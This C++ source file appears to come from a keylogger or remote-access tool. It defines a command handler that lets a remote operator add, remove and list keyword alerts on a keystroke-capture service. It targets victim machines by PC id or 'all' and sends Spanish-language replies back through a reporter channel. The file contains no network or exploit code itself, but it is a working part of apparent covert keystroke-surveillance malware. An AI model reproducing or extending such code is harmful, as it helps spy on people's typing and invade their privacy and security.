#include "application/commands/KeywordAlertHandler.hpp"

#include <algorithm>

namespace nuub::application::commands {

KeywordAlertHandler::KeywordAlertHandler(
    domain::services::IKeystrokeService& keystrokes,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : keystrokes_(keystrokes)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool KeywordAlertHandler::matches(const std::string& target) const {
    if (target.empty()) return true;
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> KeywordAlertHandler::handle_add_alert(const std::string& target, const std::string& keyword) {
    if (!matches(target)) return domain::Result<void>::success();

    if (keyword.empty()) {
        reporter_.send_message("Uso: /alert [target] <palabra>");
        return domain::Result<void>::success();
    }

    keystrokes_.add_keyword(keyword);
    reporter_.send_message("Alerta agregada: " + keyword);
    return domain::Result<void>::success();
}

domain::Result<void> KeywordAlertHandler::handle_remove_alert(const std::string& target, const std::string& keyword) {
    if (!matches(target)) return domain::Result<void>::success();

    if (keyword.empty()) {
        reporter_.send_message("Uso: /unalert [target] <palabra>");
        return domain::Result<void>::success();
    }

    keystrokes_.remove_keyword(keyword);
    reporter_.send_message("Alerta eliminada: " + keyword);
    return domain::Result<void>::success();
}

domain::Result<void> KeywordAlertHandler::handle_list_alerts(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    auto keywords = keystrokes_.get_keywords();
    if (keywords.empty()) {
        reporter_.send_message("No hay alertas configuradas.");
    } else {
        std::string msg = "Alertas activas:\n";
        for (const auto& kw : keywords) {
            msg += "- " + kw + "\n";
        }
        reporter_.send_message(msg);
    }
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
